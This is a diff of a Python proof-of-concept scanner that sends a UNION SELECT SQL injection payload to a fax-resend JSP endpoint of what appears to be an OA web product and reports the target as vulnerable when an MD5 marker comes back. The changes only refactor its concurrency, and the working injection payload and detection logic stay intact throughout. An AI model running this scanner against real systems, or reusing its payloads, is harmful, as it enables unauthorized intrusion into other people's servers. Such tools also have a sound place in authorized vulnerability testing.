@@ -13,7 +13,6 @@ GitHub:
 # -*- coding: utf-8 -*-
 from gevent import monkey;monkey.patch_all()
 from gevent.pool import Pool
-from gevent.queue import Queue
 import requests
 import os
 import sys
@@ -35,13 +34,7 @@ class poc:
     '/yyoa/ext/trafaxserver/SendFax/resend.jsp?fax_ids=(1)%20AnD%201=2%20UnIon%20SeLeCt%20Md5(1234)%20--',
         ]
         self.text_list = []
-        self.q = Queue()
         self.proxies = proxies
-
-    def vuln_path(self):
-        for payload in self.payloads:
-            self.q.put(payload)
-        return True
 
     def host(self):
         url = urlparse(self.url)
@@ -49,36 +42,29 @@ class poc:
         scheme = url.scheme
         return netloc, scheme
 
-    def vuln(self, url):
-        while True:
-            result_text = ""
-            if self.q.qsize() == 0:
-                break
-            payload = self.q.get()
-            try:
-                url = "{}{}".format(url, payload)
-                headers = {
-                    'User-Agent': get_user_agent.get_user_agent(),
-                }
-                result = requests.get(url=url, headers=headers, verify=False, proxies=self.proxies)
-                if "81dc9bdb52d04dc20036dbd8313ed055" in result.text or "52d04dc20036dbd8" in result.text:
-                    target = urlparse(url)
-                    result_text += """\n        [+]    \033[32m检测到目标站点存在SQL注入漏洞\033[0m
-                 GET {} HTTP/1.1
-                 Host: {}""".format(target.path + "?" + target.query, target.netloc)
-                    for request_type, request_text in dict(result.request.headers).items():
-                        result_text += "\n                 {}: {}".format(request_type, request_text)
-                    self.text_list.append(result_text)
-            except:
-                pass
-
-    def main(self):
+    def vuln(self, payload):
         all = self.host()
         netloc = all[0]
         scheme = all[1]
-        pool = Pool(5)
-        url = "{}://{}".format(scheme, netloc)
-        if self.vuln_path():
-            tasks = [pool.spawn(self.vuln, url) for i in range(5)]
-            pool.join()
+        result_text = ""
+        try:
+            url = "{}://{}{}".format(scheme, netloc, payload)
+            headers = {
+                'User-Agent': get_user_agent.get_user_agent(),
+            }
+            result = requests.get(url=url, headers=headers, verify=False, proxies=self.proxies)
+            if "81dc9bdb52d04dc20036dbd8313ed055" in result.text or "52d04dc20036dbd8" in result.text:
+                target = urlparse(url)
+                result_text += """\n        [+]    \033[32m检测到目标站点存在SQL注入漏洞\033[0m
+             GET {} HTTP/1.1
+             Host: {}""".format(target.path + "?" + target.query, target.netloc)
+                for request_type, request_text in dict(result.request.headers).items():
+                    result_text += "\n                 {}: {}".format(request_type, request_text)
+                self.text_list.append(result_text)
+        except:
+            pass
+
+    def main(self):
+        pool = Pool(len(self.payloads))
+        pool.map(self.vuln, self.payloads)
         return self.text_list
